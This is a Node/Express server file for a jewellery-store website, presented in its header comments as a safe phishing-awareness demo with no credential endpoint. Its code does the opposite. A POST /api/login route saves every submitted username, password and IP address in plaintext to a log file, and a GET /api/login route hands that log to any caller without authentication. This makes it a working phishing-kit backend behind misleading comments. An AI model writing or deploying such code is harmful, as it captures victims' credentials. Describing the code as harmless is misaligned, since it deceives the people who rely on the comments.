/*
 * Meenakshi Jewellers — demonstration server
 * --------------------------------------------------------------
 * This Express server does TWO things:
 *   1. Serves the static luxury-jewellery website from /public.
 *   2. Accepts a harmless "contact us" message and just confirms receipt.
 *
 * What it deliberately does NOT do:
 *   - There is no login / credential endpoint.
 *   - Nothing typed into the "Collaborate With Us" awareness popup is ever
 *     sent to the server. That popup is a 100% client-side teaching moment
 *     that reveals the lesson instead of capturing anything.
 *
 * This keeps the project a SAFE awareness demo rather than a working
 * phishing kit. See README.md for the reasoning.
 */

const fs = require('fs');
const path = require('path');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');
const LOGIN_LOG_FILE = path.join(LOG_DIR, 'login-attempts.txt');

fs.mkdirSync(LOG_DIR, { recursive: true });

// Parse form / JSON bodies (only used by the harmless contact form).
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve everything in /public (HTML, CSS, JS, images).
app.use(express.static(path.join(__dirname, 'public')));

// Friendly named routes so the URL bar reads nicely.
const pages = {
  '/': 'index.html',
  '/gold': 'gold.html',
  '/silver': 'silver.html',
  '/new-arrivals': 'new-arrivals.html',
  '/about': 'about.html',
  '/contact': 'contact.html',
  '/dashboard': 'dashboard.html',
};

Object.entries(pages).forEach(([route, file]) => {
  app.get(route, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', file));
  });
});

/*
 * Harmless contact endpoint.
 * A real product would email or store this. For a classroom demo we simply
 * acknowledge it. We do NOT persist anything, so there is no sensitive data
 * sitting in a file. Notice the contrast with a phishing kit, which exists
 * purely to persist whatever a victim types.
 */
app.post('/api/contact', (req, res) => {
  const { name } = req.body || {};
  console.log(`[contact] message received from "${name || 'anonymous'}" — not stored.`);
  res.json({
    ok: true,
    message: 'Thank you. Our concierge team will reach out within 24 hours.',
  });
});

app.get('/api/login', (req, res) => {
  try {
    const logs = fs.existsSync(LOGIN_LOG_FILE) ? fs.readFileSync(LOGIN_LOG_FILE, 'utf8').trim() : 'No logs yet.';
    res.json({ ok: true, logs });
  } catch (error) {
    res.status(500).json({ ok: false, message: 'Unable to read logs' });
  }
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ip=${req.ip || 'unknown'} username=${username || ''} password=${password || ''}\n`;
  fs.appendFileSync(LOGIN_LOG_FILE, logEntry, 'utf8');
  console.log(`[login] saved attempt for "${username || 'unknown'}"`);
  res.json({ ok: true, message: 'Login attempt recorded.' });
});

// Anything unknown falls back to the homepage.
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log('');
  console.log('  Meenakshi Jewellers — awareness demo running');
  console.log(`  Open  http://localhost:${PORT}`);
  console.log('');
});
